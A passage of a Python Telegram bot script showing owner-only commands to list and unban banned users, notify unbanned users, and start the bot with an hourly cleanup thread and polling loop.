        bot.reply_to(message, "⛔ 𝗢𝗻𝗹𝘆 𝗼𝘄𝗻𝗲𝗿 𝗰𝗮𝗻 𝘂𝗻𝗯𝗮𝗻 𝘂𝘀𝗲𝗿𝘀!")
        return
    
    # Check if there are any banned users
    if 'banned_users' not in globals() or not banned_users:
        bot.reply_to(message, "ℹ️ 𝗡𝗼 𝗯𝗮𝗻𝗻𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱 𝗶𝗻 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺.")
        return
    
    # Create a list of banned users with their details
    banned_list = []
    for user_id, ban_info in banned_users.items():
        user_data = all_users.get(user_id, {})
        username = f"@{user_data.get('username')}" if user_data.get('username') else user_data.get('first_name', 'Unknown')
        banned_by = ban_info.get('banned_by', 'System')
        banned_time = datetime.datetime.fromtimestamp(ban_info.get('timestamp', time.time())).strftime('%Y-%m-%d %H:%M')
        
        banned_list.append(
            f"🔨 𝗨𝘀𝗲𝗿: {username}\n"
            f"├ 𝗜𝗗: `{user_id}`\n"
            f"├ 𝗕𝗮𝗻𝗻𝗲𝗱 𝗯𝘆: {banned_by}\n"
            f"└ 𝗕𝗮𝗻𝗻𝗲𝗱 𝗼𝗻: {banned_time}\n"
        )
    
    # Send the list with instructions
    safe_reply_to(
        message,
        f"📋 𝗕𝗮𝗻𝗻𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 𝗟𝗶𝘀𝘁:\n\n" + "\n".join(banned_list) + 
        "\n\n⚠️ 𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗨𝘀𝗲𝗿 𝗜𝗗 𝘆𝗼𝘂 𝘄𝗮𝗻𝘁 𝘁𝗼 𝘂𝗻𝗯𝗮𝗻:",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(message, process_unban_user)

def process_unban_user(message):
    """Process user unban with premium styling"""
    user_id = message.text.strip()
    
    # Check if the user is actually banned
    if 'banned_users' not in globals() or user_id not in banned_users:
        bot.reply_to(message, f"❌ 𝗨𝘀𝗲𝗿 𝗜𝗗 `{user_id}` 𝗶𝘀 𝗻𝗼𝘁 𝗯𝗮𝗻𝗻𝗲𝗱 𝗶𝗻 𝘁𝗵𝗲 𝘀𝘆𝘀𝘁𝗲𝗺.", 
                     parse_mode="Markdown", reply_markup=create_main_keyboard(message))
        return
    
    # Get user details for confirmation
    user_data = all_users.get(user_id, {})
    username = f"@{user_data.get('username')}" if user_data.get('username') else user_data.get('first_name', 'Unknown')
    
    # Remove from banned list
    del banned_users[user_id]
    save_data()
    
    safe_reply_to(
        message,
        f"✅ 𝗨𝘀𝗲𝗿 𝘂𝗻𝗯𝗮𝗻𝗻𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\n"
        f"• 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: {username}\n"
        f"• 𝗨𝘀𝗲𝗿 𝗜𝗗: `{user_id}`\n\n"
        f"𝗧𝗵𝗲𝘆 𝗰𝗮𝗻 𝗻𝗼𝘄 𝗮𝗰𝗰𝗲𝘀𝘀 𝘁𝗵𝗲 𝗯𝗼𝘁 𝗮𝗴𝗮𝗶𝗻.",
        parse_mode="Markdown",
        reply_markup=create_main_keyboard(message)
    )
    
    # Try to notify the unbanned user if possible
    try:
        bot.send_message(
            user_id,
            "🎉 𝗬𝗢𝗨𝗥 𝗔𝗖𝗖𝗘𝗦𝗦 𝗛𝗔𝗦 𝗕𝗘𝗘𝗡 𝗥𝗘𝗦𝗧𝗢𝗥𝗘𝗗!\n\n"
            "The owner has unbanned your account. You can now use the bot again."
        )
    except Exception as e:
        print(f"Could not notify unbanned user {user_id}: {e}")


# ======================
# 🚀 BOT INITIALIZATION
# ======================
if __name__ == '__main__':
    load_data()
    load_admins()
    print("𝗕𝗼𝘁 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗹𝗮𝘂𝗻𝗰𝗵𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! »»—— 𝐀𝐋𝐎𝐍𝐄 ƁƠƳ ♥")
    
    # Run cleanup every hour
    def periodic_cleanup():
        while True:
            cleanup_expired_users()
            time.sleep(3600)  # 1 hour
            
    cleanup_thread = threading.Thread(target=periodic_cleanup)
    cleanup_thread.daemon = True
    cleanup_thread.start()
    
    bot.polling(none_stop=True)